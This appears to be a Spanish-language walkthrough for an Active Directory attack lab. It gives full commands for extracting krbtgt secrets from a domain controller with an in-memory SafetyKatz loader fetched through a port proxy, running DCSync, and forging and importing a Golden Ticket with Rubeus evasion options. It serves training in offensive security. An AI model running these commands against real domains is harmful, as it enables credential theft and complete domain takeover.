
## Tareas
- [ ] Extraer los *secrets* del controlador de domino de *dollarcorp*
- [ ] Usar los *secrets* de la cuenta *krbtgt* para crear un *Golden Ticket*
- [ ] Usar el *Golden Ticket* para obtener privilegios de administrador de dominio desde una maquina

**Flag 16: Hash NTLM de krbtgt**
**Flag 17: Hash NTLM del Domain Admin - Administrator**


## Extraer secrets del Domain Controller de *dollarcorp*

Como en nel laboratorio anterior acabamos con privilegios de administrador de dominio

Empezaremos abruiendo una ventana como Administrador de Dominio e iniciaremos un nuevo proceso como *svcadmin*
```shell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Se nos creara una terminal con usuario administrador, ahora tendremos que copiar el *Loader.exe* a la maquina *dcorp-dc*
```shell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

Nos conectaremos a la maquina como *svcadmin*
```shell
winrs -r:dcorp-dc cmd
```

Y haremos una redirección de puertos
```shell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
```

Ejecutando desde la memoria el *SafetyKatz*
```shell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
```

Pudiendo extraer así los hashes *NTLM* en este caso el que buscabamos es el del usuario *KRBTGT*

También si queremos el hash y las claves AES de una cuenta en especifico podemos usar un ataque *DCSync*
``` shell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

Con estos hashes podemos crear un *Golden Ticket*
```shell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

Con el resultado de la ejecución tendremos que agregar el comando como argumento al *Loader.exe* y así poder crear un *Golden Ticket*
```shell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

Tras crearlo y este ser importado tendremos que acceder a la maquina para ver nuestros privilegios
```shell
winrs -r:dcorp-dc cmd
set username
set computername
```

